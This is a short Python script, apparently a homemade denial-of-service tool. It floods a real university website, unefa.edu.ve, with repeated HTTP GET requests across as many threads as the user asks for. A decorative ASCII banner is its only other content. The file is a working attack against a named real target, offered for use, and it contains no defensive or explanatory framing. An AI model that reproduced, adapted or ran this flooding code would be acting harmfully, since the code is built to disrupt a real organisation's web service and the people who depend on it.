import requests
from colorama import Fore, init
import os
from threading import Thread

init()


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(Fore.YELLOW + """
        _______________¶¶¶¶¶¶
        __________¶¶¶¶¶¶¶¶__¶¶
        _____¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶
        _¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
        ¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
        _¶¶ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
        ___ ¶¶¶¶¶¶¶¶¶¶¶ [█]¶¶¶¶¶
        ____¶¶¶¶¶ [█] ¶¶¶¶¶¶¶¶¶¶
        _____¶¶¶¶¶¶¶`▼´¶¶¶¶¶¶
        ______¶¶¶¶¶¶¶·♥·¶¶¶¶¶
        __¤'¤'¤'¤'¤'¤'¤¶¶¶¶¶¶¤'¤'¤'¤'¤'¤'¤
        __¶¶¶¶¶'¤'¤'¤'¤'¤I T.'¤'¤'¤'¶¶¶¶¶¶
        ¶¶¶¶¶¶¶¶¤'¤'¤'¤'¤'¤'¤'¤'¤¶¶¶¶¶¶¶¶
        ¶¶____ ¶¶¶¶¶'¤'¤'¤'¤'¶¶¶¶¶____ ¶¶
        ¶¶_____ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶
        _¶¶___¶¶¶¶¶________¶¶¶¶___¶¶
        __¶¶¶¶¶¶¶¶___________¶¶¶¶¶¶


                              || MACM ||
""")

count = 0

def petition():
    for i in range(9999):
        try:
            requests.get('http://www.unefa.edu.ve')
        except requests.exceptions.Timeout:
            print('❌ The request timed out, trying again')
            petition()
        except requests.exceptions.RequestException as e:
            print("❌ An error occurred, trying again", e)
            petition()

        global count
        count += 1

        print(f'✅ unefa.edu.ve Count: {count}')


def start():
    clear()
    threads = int(input("how many threads do you want to use: "))
    input("Press enter to continue...")
    for i in range(threads):
        Thread(target=petition).start()


start()